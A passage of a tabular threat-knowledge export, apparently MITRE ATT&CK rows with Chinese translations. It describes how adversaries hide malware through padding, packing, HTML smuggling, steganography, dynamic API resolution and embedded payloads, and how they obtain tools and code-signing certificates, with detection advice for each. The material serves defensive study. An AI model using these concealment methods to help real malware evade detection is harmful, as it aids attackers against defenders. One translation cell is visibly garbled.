2021),(Citation: NCC Group WastedLocker June 2020),(Citation: SentinelOne NobleBaron June 2021),(Citation: Zscaler Higaisa 2020),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: ESET Gamaredon June 2020),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: Haq 2014),(Citation: Trend Micro Tick November 2019),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: FinFisher Citation),(Citation: McAfee Maze March 2020),(Citation: ESET OceanLotus Mar 2019),(Citation: Talos Bisonal Mar 2020),(Citation: ESET Sednit Part 2),(Citation: FireEye APT28),(Citation: Proofpoint Leviathan Oct 2017),(Citation: TrendMicro POWERSTATS V3 June 2019),(Citation: Trend Micro Qakbot May 2020),(Citation: Group IB Ransomware September 2020),(Citation: ESET OceanLotus),(Citation: Palo Alto Comnie),(Citation: Group IB GrimAgent July 2021),(Citation: ASERT Donot March 2018),(Citation: Avira Mustang Panda January 2020),(Citation: ESET Dukes October 2019),(Citation: Cybereason Cobalt Kitty 2017),(Citation: ESET Grandoreiro April 2020),(Citation: Sophos SamSam Apr 2018),(Citation: BlackBerry CostaRicto November 2020),(Citation: CISA MAR-10288834-2.v1  TAINTEDSCRIBE MAY 2020),(Citation: Proofpoint ZeroT Feb 2017),(Citation: Carbon Black HotCroissant April 2020),(Citation: Symantec Orangeworm April 2018),(Citation: TrendMicro Patchwork Dec 2017),(Citation: Emissary Trojan Feb 2016),(Citation: Microsoft FinFisher March 2018),",混淆文件或信息：二进制填充,攻击者可能会使用二进制填充来添加垃圾数据并更改恶意软件的磁盘表示。这可以在不影响二进制文件的功能或行为的情况下完成，但由于文件大小限制，二进制文件的大小可能会超出某些安全工具的处理能力。二进制填充有效地改变了文件的校验和，也可以用来避免基于哈希的阻止列表和静态防病毒签名。（引用：ESET OceanLotus）使用的填充通常由一个函数生成，以创建垃圾数据，然后附加到结束或应用于恶意软件的部分。（引文：Securelist Malware Tricks April 2017）增加文件大小可能会降低某些工具和检测功能的有效性，这些工具和检测功能不是为扫描大文件而设计或配置的。这也可能降低被收集进行分析的可能性。公共文件扫描服务，例如 VirusTotal，限制了要分析的上传文件的最大大小。（引用：VirusTotal 常见问题解答）
T1027.004,Obfuscated Files or Information: Compile After Delivery,"Adversaries may attempt to make payloads difficult to discover and analyze by delivering files to victims as uncompiled code. Text-based source code files may subvert analysis and scrutiny from protections targeting executables/binaries. These payloads will need to be compiled before execution; typically via native utilities such as csc.exe or GCC/MinGW.(Citation: ClearSky MuddyWater Nov 2018)

Source code payloads may also be encrypted, encoded, and/or embedded within other files, such as those delivered as a [Phishing](https://attack.mitre.org/techniques/T1566). Payloads may also be delivered in formats unrecognizable and inherently benign to the native OS (ex: EXEs on macOS/Linux) before later being (re)compiled into a proper executable binary with a bundled compiler and execution framework.(Citation: TrendMicro WindowsAppMac)",https://attack.mitre.org/techniques/T1027/004,16 March 2020,29 March 2020,1.0,Defense Evasion,"Monitor the execution file paths and command-line arguments for common compilers, such as csc.exe and GCC/MinGW, and correlate with other suspicious behavior to reduce false positives from normal user and administrator behavior. The compilation of payloads may also generate file creation and/or file write events. Look for non-native binary formats and cross-platform compiler and execution frameworks like Mono and determine if they have a legitimate purpose on the system.(Citation: TrendMicro WindowsAppMac) Typically these should only be used in specific and limited cases, like for software development.","Linux, Windows, macOS","Command: Command Execution, File: File Creation, File: File Metadata, Process: Process Creation",True,T1027,"Anti-virus, Binary Analysis, Host intrusion prevention systems, Signature-based detection, Static File Analysis","Praetorian; Ye Yint Min Thu Htut, Offensive Security Team, DBS Bank",User,,Compiler software (either native to the system or delivered by the adversary),,,,"(Citation: Trend Micro njRAT 2018),(Citation: PaloAlto CardinalRat Apr 2017),(Citation: Anomali Rocke March 2019),(Citation: ClearSky MuddyWater Nov 2018),(Citation: ESET Gamaredon June 2020),(Citation: Prevailion DarkWatchman 2021),(Citation: MSTIC FoggyWeb September 2021),",混淆文件或信息：交付后编译,攻击者可能试图通过将文件作为未编译的代码交付给受害者，从而使有效载荷难以被发现和分析。基于文本的源代码文件可能会破坏针对可执行文件/二进制文件的保护的分析和审查。这些有效载荷需要在执行前编译；通常通过 csc.exe 或 GCC/MinGW 等本机实用程序。（引用：ClearSky MuddyWater Nov 2018）源代码有效负载也可以被加密、编码和/或嵌入到其他文件中，例如作为 [网络钓鱼]（ https://attack.mitre.org/techniques/T1566）。有效负载也可能以无法识别且对本机操作系统本质上是良性的格式交付（例如：macOS/Linux 上的 EXE），然后再通过捆绑的编译器和执行框架（重新）编译成适当的可执行二进制文件。（引用：TrendMicro WindowsAppMac）
T1027.007,Obfuscated Files or Information: Dynamic API Resolution,"Adversaries may obfuscate then dynamically resolve API functions called by their malware in order to conceal malicious functionalities and impair defensive analysis. Malware commonly uses various [Native API](https://attack.mitre.org/techniques/T1106) functions provided by the OS to perform various tasks such as those involving processes, files, and other system artifacts.

API functions called by malware may leave static artifacts such as strings in payload files. Defensive analysts may also uncover which functions a binary file may execute via an import address table (IAT) or other structures that help dynamically link calling code to the shared modules that provide functions.(Citation: Huntress API Hash)(Citation: IRED API Hashing)

To avoid static or other defensive analysis, adversaries may use dynamic API resolution to conceal malware characteristics and functionalities. Similar to [Software Packing](https://attack.mitre.org/techniques/T1027/002), dynamic API resolution may change file signatures and obfuscate malicious API function calls until they are resolved and invoked during runtime.

Various methods may be used to obfuscate malware calls to API functions. For example, hashes of function names are commonly stored in malware in lieu of literal strings. Malware can use these hashes (or other identifiers) to manually reproduce the linking and loading process using functions such as `GetProcAddress()` and `LoadLibrary()`. These hashes/identifiers can also be further obfuscated using encryption or other string manipulation tricks (requiring various forms of [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) during execution).(Citation: BlackHat API Packers)(Citation: Drakonia HInvoke)(Citation: Huntress API Hash)",https://attack.mitre.org/techniques/T1027/007,22 August 2022,23 August 2022,1.0,Defense Evasion,,Windows,"File: File Metadata, Module: Module Load, Process: OS API Execution",True,T1027,,,,,,,,,"(Citation: NCC Group Team9 June 2020),(Citation: Cybereason Bazar July 2020),(Citation: Microsoft Actinium February 2022),(Citation: Lazarus APT January 2022),",混淆文件或信息：动态 API 解析,攻击者可能会混淆然后动态解析其恶意软件调用的 API 函数，以隐藏恶意功能并削弱防御分析。恶意软件通常使用操作系统提供的各种 [Native API](https://attack.mitre.org/techniques/T1106) 函数来执行各种任务，例如涉及进程、文件和其他系统工件的任务。恶意软件调用的 API 函数可能会在负载文件中留下静态工件，例如字符串。防御性分析师还可以通过导入地址表 (IAT) 或其他有助于将调用代码动态链接到提供函数的共享模块的结构来发现二进制文件可以执行哪些功能。（引用：Huntress API 哈希）（引用：IRED API 哈希） ) 为避免静态或其他防御性分析，攻击者可能会使用动态 API 解析来隐藏恶意软件的特征和功能。与 [Software Packing](https://attack.mitre.org/techniques/T1027/002) 类似，动态 API 解析可能会更改文件签名并混淆恶意 API 函数调用，直到它们在运行时被解析和调用。可以使用各种方法来混淆恶意软件对 API 函数的调用。例如，函数名称的哈希值通常存储在恶意软件中以代替文字字符串。恶意软件可以使用这些哈希值（或其他标识符）使用诸如“GetProcAddress()”和“LoadLibrary()”之类的函数手动重现链接和加载过程。这些哈希/标识符也可以使用加密或其他字符串操作技巧进一步混淆（在执行期间需要各种形式的 [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140)）。（引文: BlackHat API Packers)(引文: Drakonia HInvoke)(引文: Huntress API Hash)
T1027.009,Obfuscated Files or Information: Embedded Payloads,"Adversaries may embed payloads within other files to conceal malicious content from defenses. Otherwise seemingly benign files (such as scripts and executables) may be abused to carry and obfuscate malicious payloads and content. In some cases, embedded payloads may also enable adversaries to [Subvert Trust Controls](https://attack.mitre.org/techniques/T1553) by not impacting execution controls such as digital signatures and notarization tickets.(Citation: Sentinel Labs) 

Adversaries may embed payloads in various file formats to hide payloads.(Citation: Microsoft Learn) This is similar to [Steganography](https://attack.mitre.org/techniques/T1027/003), though does not involve weaving malicious content into specific bytes and patterns related to legitimate digital media formats.(Citation: GitHub PSImage) 

For example, adversaries have been observed embedding payloads within or as an overlay of an otherwise benign binary.(Citation: Securelist Dtrack2) Adversaries have also been observed nesting payloads (such as executables and run-only scripts) inside a file of the same format.(Citation: SentinelLabs reversing run-only applescripts 2021) 

Embedded content may also be used as [Process Injection](https://attack.mitre.org/techniques/T1055) payloads used to infect benign system processes.(Citation: Trend Micro) These embedded then injected payloads may be used as part of the modules of malware designed to provide specific features such as encrypting C2 communications in support of an orchestrator module. For example, an embedded module may be injected into default browsers, allowing adversaries to then communicate via the network.(Citation: Malware Analysis Report ComRAT)",https://attack.mitre.org/techniques/T1027/009,30 September 2022,21 October 2022,1.0,Defense Evasion,,"Linux, Windows, macOS","File: File Creation, File: File Metadata",True,T1027,,"Nick Cairns, @grotezinfosec",,,User,,,,"(Citation: CISA ComRAT Oct 2020),(Citation: SentinelLabs reversing run-only applescripts 2021),(Citation: GitHub PSImage),(Citation: ESET ComRAT May 2020),(Citation: FireEye SMOKEDHAM June 2021),(Citation: Securelist Dtrack),(Citation: win10_asr)",混淆文件或信息：嵌入式有效负载,攻击者可能会在其他文件中嵌入有效负载，以隐藏恶意内容免受防御。否则，看似良性的文件（例如脚本和可执行文件）可能会被滥用来携带和混淆恶意负载和内容。在某些情况下，嵌入式有效负载还可以通过不影响执行控制（例如数字签名和公证票据）使攻击者能够[颠覆信任控制]（https://attack.mitre.org/techniques/T1553）。（引用：Sentinel Labs）攻击者可能会以各种文件格式嵌入有效负载以隐藏有效负载。（引用：Microsoft Learn）这类似于 [Steganography]（https://attack.mitre.org/techniques/T1027/003），但不涉及编织恶意内容到与合法数字媒体格式相关的特定字节和模式。（引用：GitHub PSImage）例如，已经观察到攻击者将有效负载嵌入到其他良性二进制文件中或作为其覆盖。（引用：Securelist Dtrack2）还观察到攻击者嵌套有效负载（例如可执行文件和仅运行脚本）在相同格式的文件中。（引用：SentinelLabs 反转仅运行的 AppleScripts 2021）嵌入的内容也可以用作 [Process Injection]（https://attack.mitre. org/techniques/T1055) 用于感染良性系统进程的有效负载。（引用：趋势科技）这些嵌入然后注入的有效负载可用作恶意软件模块的一部分，旨在提供特定功能，例如加密 C2 通信以支持协调器模块。例如，可以将嵌入式模块注入默认浏览器，从而允许攻击者通过网络进行通信。（引用：恶意软件分析报告 ComRAT）
T1027.006,Obfuscated Files or Information: HTML Smuggling,"Adversaries may smuggle data and files past content filters by hiding malicious payloads inside of seemingly benign HTML files. HTML documents can store large binary objects known as JavaScript Blobs (immutable data that represents raw bytes) that can later be constructed into file-like objects. Data may also be stored in Data URLs, which enable embedding media type or MIME files inline of HTML documents. HTML5 also introduced a download attribute that may be used to initiate file downloads.(Citation: HTML Smuggling Menlo Security 2020)(Citation: Outlflank HTML Smuggling 2018)

Adversaries may deliver payloads to victims that bypass security controls through HTML Smuggling by abusing JavaScript Blobs and/or HTML5 download attributes. Security controls such as web content filters may not identify smuggled malicious files inside of HTML/JS files, as the content may be based on typically benign MIME types such as <code>text/plain</code> and/or <code>text/html</code>. Malicious files or data can be obfuscated and hidden inside of HTML files through Data URLs and/or JavaScript Blobs and can be deobfuscated when they reach the victim (i.e. [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140)), potentially bypassing content filters.

For example, JavaScript Blobs can be abused to dynamically generate malicious files in the victim machine and may be dropped to disk by abusing JavaScript functions such as <code>msSaveBlob</code>.(Citation: HTML Smuggling Menlo Security 2020)(Citation: MSTIC NOBELIUM May 2021)(Citation: Outlflank HTML Smuggling 2018)(Citation: nccgroup Smuggling HTA 2017)",https://attack.mitre.org/techniques/T1027/006,20 May 2021,19 May 2022,1.0,Defense Evasion,"Detection of HTML Smuggling is difficult as HTML5 and JavaScript attributes are used by legitimate services and applications. HTML Smuggling can be performed in many ways via JavaScript, developing rules for the different variants, with a combination of different encoding and/or encryption schemes, may be very challenging.(Citation: Outlflank HTML Smuggling 2018) Detecting specific JavaScript and/or HTML5 attribute strings such as <code>Blob</code>, <code>msSaveOrOpenBlob</code>, and/or <code>download</code> may be a good indicator of HTML Smuggling. These strings may also be used by legitimate services therefore it is possible to raise false positives.

Consider monitoring files downloaded from the Internet, possibly by HTML Smuggling, for suspicious activities. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities.","Linux, Windows, macOS",File: File Creation,True,T1027,"Anti-virus, Static File Analysis, Web Content Filters","Jonathan Boucher, @crash_wave, Bank of Canada; Krishnan Subramanian, @krish203; Stan Hegt, Outflank; Vinay Pidathala",,,,,,,"(Citation: ESET T3 Threat Report 2021),(Citation: MSTIC Nobelium Toolset May 2021),",混淆文件或信息：HTML 走私,攻击者可能会通过将恶意负载隐藏在看似良性的 HTML 文件中，从而将数据和文件走私通过内容过滤器。 HTML 文档可以存储称为 JavaScript Blob（表示原始字节的不可变数据）的大型二进制对象，以后可以将其构造成类似文件的对象。数据也可以存储在数据 URL 中，从而可以将媒体类型或 MIME 文件嵌入 HTML 文档。 HTML5 还引入了可用于启动文件下载的下载属性。（引文：HTML Smuggling Menlo Security 2020）（引文：Outlflank HTML Smuggling 2018）攻击者可能通过滥用 JavaScript Blob 和 HTML Smuggling 向绕过安全控制的受害者提供有效负载和/ 或 HTML5 下载属性。 Web 内容过滤器等安全控制可能无法识别 HTML/JS 文件中的走私恶意文件，因为内容可能基于典型的良性 MIME 类型，例如 <code>text/plain</code> 和/或 <code>text /html</代码>。恶意文件或数据可以通过数据 URL 和/或 JavaScript Blob 被混淆并隐藏在 HTML 文件中，并且可以在它们到达受害者时被反混淆（即[反混淆/解码文件或信息]（https://attack.mitre.org /techniques/T1140))，可能会绕过内容过滤器。例如，JavaScript Blob 可被滥用以在受害机器中动态生成恶意文件，并可能通过滥用 JavaScript 函数（例如 <code>msSaveBlob</code>）将其拖放到磁盘中。（引用：HTML Smuggling Menlo Security 2020）（引用： MSTIC NOBELIUM 2021 年 5 月）（引用：Outlflank HTML Smuggling 2018）（引用：nccgroup Smuggling HTA 2017）
T1027.005,Obfuscated Files or Information: Indicator Removal from Tools,"Adversaries may remove indicators from tools if they believe their malicious tool was detected, quarantined, or otherwise curtailed. They can modify the tool by removing the indicator and using the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems.

A good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may modify the file to explicitly avoid that signature, and then re-use the malware.",https://attack.mitre.org/techniques/T1027/005,19 March 2020,28 April 2022,1.1,Defense Evasion,"The first detection of a malicious tool may trigger an anti-virus or other security tool alert. Similar events may also occur at the boundary through network IDS, email scanning appliance, etc. The initial detection should be treated as an indication of a potentially more invasive intrusion. The alerting system should be thoroughly investigated beyond that initial alert for activity that was not detected. Adversaries may continue with an operation, assuming that individual events like an anti-virus detect will not be investigated or that an analyst will not be able to conclusively link that event to other activity occurring on the network.","Linux, Windows, macOS",Application Log: Application Log Content,True,T1027,"Anti-virus, Host intrusion prevention systems, Log analysis, Signature-based detection",,,,,,,,"(Citation: Palo Alto OilRig April 2017),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: CrowdStrike SUNSPOT Implant January 2021),(Citation: Leonardo Turla Penquin May 2020),(Citation: Trend Micro Waterbear December 2019),(Citation: FoxIT Wocao December 2019),(Citation: Symantec Black Vine),(Citation: Trend Micro Daserf Nov 2017),(Citation: ESET InvisiMole June 2020),(Citation: GitHub PowerSploit May 2012),(Citation: Cybereason Soft Cell June 2019),(Citation: Talos GravityRAT),(Citation: cobaltstrike manual),(Citation: Unit42 OilRig Nov 2018),(Citation: PowerSploit Documentation),(Citation: Crowdstrike Qakbot October 2020),(Citation: APT3 Adversary Emulation Plan),(Citation: TrendMicro Patchwork Dec 2017),(Citation: Cyberint Qakbot May 2021),(Citation: FireEye TEMP.Veles 2018),(Citation: ESET Gazer Aug 2017),",混淆文件或信息：从工具中删除指示符,如果攻击者认为他们的恶意工具已被检测到、隔离或以其他方式被限制，他们可能会从工具中删除指标。他们可以通过删除指示器并使用目标防御系统或可能使用类似系统的后续目标不再检测到的更新版本来修改工具。一个很好的例子是检测到带有文件签名的恶意软件并被防病毒软件隔离。可以确定恶意软件因其文件签名而被隔离的对手可以修改文件以明确避免该签名，然后重新使用恶意软件。
T1027.002,Obfuscated Files or Information: Software Packing,"Adversaries may perform software packing or virtual machine software protection to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code.(Citation: ESET FinFisher Jan 2018) 

Utilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.(Citation: Awesome Executable Packing)  ",https://attack.mitre.org/techniques/T1027/002,05 February 2020,19 April 2022,1.2,Defense Evasion,"Use file scanning to look for known software packers or artifacts of packing techniques. Packing is not a definitive indicator of malicious activity, because legitimate software may use packing techniques to reduce binary size or to protect proprietary code.","Linux, Windows, macOS",File: File Metadata,True,T1027,"Anti-virus, Heuristic detection, Signature-based detection","Filip Kafka, ESET",,,,CAPEC-570,,,"(Citation: Cyberreason Anchor December 2019),(Citation: Kaspersky Adwind Feb 2016),(Citation: Cylance Shaheen Nov 2018),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: FinFisher Citation),(Citation: Symantec RAINDROP January 2021),(Citation: Symantec Elderwood Sept 2012),(Citation: McAfee Babuk February 2021),(Citation: Trend Micro Iron Tiger April 2021),(Citation: Malwarebytes Kimsuky June 2021),(Citation: ESET Operation Spalax Jan 2021),(Citation: Cybereason Bazar July 2020),(Citation: Fortinet Metamorfo Feb 2020),(Citation: Malwarebytes KONNI Evolves Jan 2022),(Citation: NHS Digital Egregor Nov 2020),(Citation: Securelist Dropping Elephant),(Citation: Trend Micro DRBControl February 2020),(Citation: BlackBerry CostaRicto November 2020),(Citation: US-CERT BLINDINGCAN Aug 2020),(Citation: Cyble Egregor Oct 2020),(Citation: Cisco H1N1 Part 1),(Citation: McAfee Cuba April 2021),(Citation: Unit42 Sofacy Dec 2018),(Citation: Secureworks Karagany July 2019),(Citation: Unit42 Molerat Mar 2020),(Citation: Cybereason Clop Dec 2020),(Citation: S2 Grupo TrickBot June 2017),(Citation: hexed osx.dok analysis 2019),(Citation: Symantec Dragonfly),(Citation: Unit 42 OopsIE! Feb 2018),(Citation: McAfee Night Dragon),(Citation: Talos Bisonal Mar 2020),(Citation: FireEye SUNSHUTTLE Mar 2021),(Citation: McAfee Lazarus Nov 2020),(Citation: Cybereason Kimsuky November 2020),(Citation: Unit 42 VERMIN Jan 2018),(Citation: Donut Github),(Citation: Securelist BlackOasis Oct 2017),(Citation: Anomali Rocke March 2019),(Citation: FireEye Clandestine Wolf),(Citation: Check Point APT31 February 2021),(Citation: Red Canary NETWIRE January 2020),(Citation: IBM TA505 April 2020),(Citation: Proofpoint ZeroT Feb 2017),(Citation: Lookout Dark Caracal Jan 2018),(Citation: Mandiant No Easy Breach),(Citation: Cylance Dust Storm),(Citation: Medium Babuk February 2021),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: ZScaler Squirrelwaffle Sep 2021),(Citation: Talos Rocke August 2018),(Citation: Unit 42 Lucifer June 2020),(Citation: Unit 42 Rocke January 2019),(Citation: Accenture SNAKEMACKEREL Nov 2018),(Citation: Trend Micro Daserf Nov 2017),(Citation: Infoblox Lokibot January 2019),(Citation: BitDefender Chafer May 2020),(Citation: Malwarebytes DarkComet March 2018),(Citation: Cybereason Soft Cell June 2019),(Citation: Sogeti CERT ESEC Babuk March 2021),(Citation: FOX-IT May 2016 Mofang),(Citation: Trend Micro Emotet Jan 2019),(Citation: Lee 2013),(Citation: Securelist APT10 March 2021),(Citation: Kaspersky Tomiris Sep 2021),(Citation: ESET Dukes October 2019),(Citation: SentinelOne Valak June 2020),(Citation: ESET OceanLotus macOS April 2019),(Citation: Zscaler Bazar September 2020),(Citation: Trend Micro TeamTNT),(Citation: FireEye APT39 Jan 2019),(Citation: ESET Machete July 2019),(Citation: Unit 42 SeaDuke 2015),(Citation: Cybereason Astaroth Feb 2019),(Citation: Mcafee Clop Aug 2019),(Citation: Unit 42 Hildegard Malware),(Citation: Malwarebytes Saint Bot April 2021),(Citation: ClearSky Lazarus Aug 2020),(Citation: FireEye APT38 Oct 2018),(Citation: ASERT Donot March 2018),(Citation: Symantec Waterbug),(Citation: Dragos Crashoverride 2018),(Citation: Juniper IcedID June 2020),(Citation: ESET GreyEnergy Oct 2018),(Citation: APT3 Adversary Emulation Plan),(Citation: Carbon Black HotCroissant April 2020),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: Cyberint Qakbot May 2021),(Citation: Malwarebytes Dyreza November 2015),(Citation: Netskope Squirrelwaffle Oct 2021),",混淆文件或信息：软件打包,攻击者可能会执行软件打包或虚拟机软件保护来隐藏他们的代码。软件打包是一种压缩或加密可执行文件的方法。打包可执行文件会更改文件签名，以避免基于签名的检测。大多数解压缩技术解压缩内存中的可执行代码。虚拟机软件保护将可执行文件的原始代码转换为只有特殊虚拟机才能运行的特殊格式。然后调用虚拟机来运行此代码。（引用：ESET FinFisher 2018 年 1 月）用于执行软件打包的实用程序称为打包程序。示例打包程序是 MPRESS 和 UPX。可以使用更全面的已知打包程序列表，但攻击者可能会创建自己的打包技术，这些技术不会留下与知名打包程序相同的工件来逃避防御。（引用：令人敬畏的可执行打包）
T1027.003,Obfuscated Files or Information: Steganography,"Adversaries may use steganography techniques in order to prevent the detection of hidden information. Steganographic techniques can be used to hide data in digital media such as images, audio tracks, video clips, or text files.

[Duqu](https://attack.mitre.org/software/S0038) was an early example of malware that used steganography. It encrypted the gathered information from a victim's system and hid it within an image before exfiltrating the image to a C2 server.(Citation: Wikipedia Duqu) 

By the end of 2017, a threat group used <code>Invoke-PSImage</code> to hide [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands in an image file (.png) and execute the code on a victim's system. In this particular case the [PowerShell](https://attack.mitre.org/techniques/T1059/001) code downloaded another obfuscated script to gather intelligence from the victim's machine and communicate it back to the adversary.(Citation: McAfee Malicious Doc Targets Pyeongchang Olympics)  ",https://attack.mitre.org/techniques/T1027/003,05 February 2020,15 October 2021,1.2,Defense Evasion,Detection of steganography is difficult unless artifacts are left behind by the obfuscation process that are detectable with a known signature. Look for strings or other signatures left in system artifacts related to decoding steganography.,"Linux, Windows, macOS",File: File Metadata,True,T1027,,,,,,CAPEC-636,,,"(Citation: Talos Group123),(Citation: MalwareBytes Lazarus-Andariel Conceals Code April 2021),(Citation: Trend Micro Tick November 2019),(Citation: Talos Oblique RAT March 2021),(Citation: Symantec RAINDROP January 2021),(Citation: TrendMicro EarthLusca 2022),(Citation: GitHub Invoke-PSImage),(Citation: Antiy CERT Ramsay April 2020),(Citation: Kaspersky Andariel Ransomware June 2021),(Citation: Group IB Ransomware September 2020),(Citation: ClearSky MuddyWater Nov 2018),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: ESET Operation Spalax Jan 2021),(Citation: CISA AA21-200A APT40 July 2021),(Citation: Securelist ScarCruft May 2019),(Citation: ESET Okrum July 2019),(Citation: Unit42 RDAT July 2020),(Citation: ESET Dukes October 2019),(Citation: Fortinet Diavol July 2021),(Citation: Unit 42 TA551 Jan 2021),(Citation: Juniper IcedID June 2020),(Citation: CheckPoint Bandook Nov 2020),(Citation: Volexity PowerDuke November 2016),",混淆文件或信息：隐写术,攻击者可能会使用隐写技术来防止检测到隐藏信息。隐写技术可用于隐藏数字媒体中的数据，例如图像、音轨、视频剪辑或文本文件。 [Duqu](https://attack.mitre.org/software/S0038) 是使用隐写术的恶意软件的早期示例。它对从受害者系统收集的信息进行加密，并将其隐藏在图像中，然后将图像泄露到 C2 服务器。（引用：Wikipedia Duqu）到 2017 年底，一个威胁组织使用 <code>Invoke-PSImage</code>在图像文件 (.png) 中隐藏 [PowerShell](https://attack.mitre.org/techniques/T1059/001) 命令并在受害者的系统上执行代码。在这种特殊情况下，[PowerShell](https://attack.mitre.org/techniques/T1059/001) 代码下载了另一个混淆脚本，以从受害者的机器中收集情报并将其传回给对手。（引用：McAfee Malicious Doc瞄准平昌奥运会）
T1027.008,Obfuscated Files or Information: Stripped Payloads,"Adversaries may attempt to make a payload difficult to analyze by removing symbols, strings, and other human readable information. Scripts and executables may contain variables names and other strings that help developers document code functionality. Symbols are often created by an operating system’s `linker` when executable payloads are compiled. Reverse engineers use these symbols and strings to analyze code and to identify functionality in payloads.(Citation: Mandiant golang stripped binaries explanation)(Citation: intezer stripped binaries elf files 2018)

Adversaries may use stripped payloads in order to make malware analysis more difficult. For example, compilers and other tools may provide features to remove or obfuscate strings and symbols. Adversaries have also used stripped payload formats, such as run-only AppleScripts, a compiled and stripped version of [AppleScript](https://attack.mitre.org/techniques/T1059/002), to evade detection and analysis. The lack of human-readable information may directly hinder detection and analysis of payloads.(Citation: SentinelLabs reversing run-only applescripts 2021)",https://attack.mitre.org/techniques/T1027/008,29 September 2022,20 October 2022,1.0,Defense Evasion,,"Linux, Windows, macOS","File: File Metadata, Module: Module Load, Process: Process Metadata",True,T1027,,,,,,,,,"(Citation: SentinelLabs reversing run-only applescripts 2021),",混淆文件或信息：剥离的有效负载,攻击者可能会尝试通过删除符号、字符串和其他人类可读信息来使有效负载难以分析。脚本和可执行文件可能包含有助于开发人员记录代码功能的变量名称和其他字符串。编译可执行有效负载时，符号通常由操作系统的“链接器”创建。逆向工程师使用这些符号和字符串来分析代码并识别有效负载中的功能。（引文：Mandiant golang 剥离二进制文件解释）（引文：intezer 剥离二进制文件 elf 文件 2018）攻击者可能使用剥离的有效载荷以使恶意软件分析更加困难。例如，编译器和其他工具可能会提供删除或混淆字符串和符号的功能。攻击者还使用剥离的有效负载格式，例如仅运行 AppleScripts，[AppleScript] (https://attack.mitre.org/techniques/T1059/002) 的编译和剥离版本，以逃避检测和分析。缺乏人类可读信息可能会直接阻碍有效载荷的检测和分析。（引用：SentinelLabs 反转仅运行的 AppleScript 2021）
T1588,Obtain Capabilities,"Adversaries may buy and/or steal capabilities that can be used during targeting. Rather than developing their own capabilities in-house, adversaries may purchase, freely download, or steal them. Activities may include the acquisition of malware, software (including licenses), exploits, certificates, and information relating to vulnerabilities. Adversaries may obtain capabilities to support their operations throughout numerous phases of the adversary lifecycle.

In addition to downloading free malware, software, and exploits from the internet, adversaries may purchase these capabilities from third-party entities. Third-party entities can include technology companies that specialize in malware and exploits, criminal marketplaces, or from individuals.(Citation: NationsBuying)(Citation: PegasusCitizenLab)

In addition to purchasing capabilities, adversaries may steal capabilities from third-party entities (including other adversaries). This can include stealing software licenses, malware, SSL/TLS and code-signing certificates, or raiding closed databases of vulnerabilities or exploits.(Citation: DiginotarCompromise)",https://attack.mitre.org/techniques/T1588,01 October 2020,18 October 2021,1.1,Resource Development,"Consider analyzing malware for features that may be associated with malware providers, such as compiler used, debugging artifacts, code similarities, or even group identifiers associated with specific Malware-as-a-Service (MaaS) offerings. Malware repositories can also be used to identify additional samples associated with the developers and the adversary utilizing their services. Identifying overlaps in malware use by different adversaries may indicate malware was obtained by the adversary rather than developed by them. In some cases, identifying overlapping characteristics in malware used by different adversaries may point to a shared quartermaster.(Citation: FireEyeSupplyChain) Malware repositories can also be used to identify features of tool use associated with an adversary, such as watermarks in [Cobalt Strike](https://attack.mitre.org/software/S0154) payloads.(Citation: Analyzing CS Dec 2020)

Consider use of services that may aid in the tracking of newly issued certificates and/or certificates in use on sites across the Internet. In some cases it may be possible to pivot on known pieces of certificate information to uncover other adversary infrastructure.(Citation: Splunk Kovar Certificates 2017) Some server-side components of adversary tools may have default values set for SSL/TLS certificates.(Citation: Recorded Future Beacon Certificates)

Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Defense Evasion or Command and Control.",PRE,"Certificate: Certificate Registration, Internet Scan: Response Content, Malware Repository: Malware Content, Malware Repository: Malware Metadata",False,,,,,,,,,,",",获取能力,攻击者可能会购买和/或窃取可在定位期间使用的能力。攻击者可能会购买、免费下载或窃取它们，而不是在内部开发自己的功能。活动可能包括获取恶意软件、软件（包括许可证）、漏洞利用、证书和与漏洞相关的信息。攻击者可以获得在攻击者生命周期的多个阶段支持其操作的能力。除了从互联网下载免费的恶意软件、软件和漏洞利用之外，攻击者还可以从第三方实体购买这些功能。第三方实对手）。这可能包括窃取软件许可证、恶意软件、SSL/TLS 和代码签名证书，或突袭封闭的漏洞或漏洞数据库。（引用：DiginotarCompromise）
T1588.003,Obtain Capabilities: Code Signing Certificates,"Adversaries may buy and/or steal code signing certificates that can be used during targeting. Code signing is the process of digitally signing executables and scripts to confirm the software author and guarantee that the code has not been altered or corrupted. Code signing provides a level of authenticity for a program from the developer and a guarantee that the program has not been tampered with.(Citation: Wikipedia Code Signing) Users and/or security tools may trust a signed piece of code more than an unsigned piece of code even if they don't know who issued the certificate or who the author is.

Prior to [Code Signing](https://attack.mitre.org/techniques/T1553/002), adversaries may purchase or steal code signing certificates for use in operations. The purchase of code signing certificates may be done using a front organization or using information stolen from a previously compromised entity that allows the adversary to validate to a certificate provider as that entity. Adversaries may also steal code signing materials directly from a compromised third-party.",https://attack.mitre.org/techniques/T1588/003,01 October 2020,17 October 2021,1.1,Resource Development,"Consider analyzing code signing certificates for features that may be associated with the adversary and/or their developers, such as the thumbprint, algorithm used, validity period, common name, and certificate authority. Malware repositories can also be used to identify additional samples associated with the adversary and identify patterns an adversary has used in procuring code signing certificates.

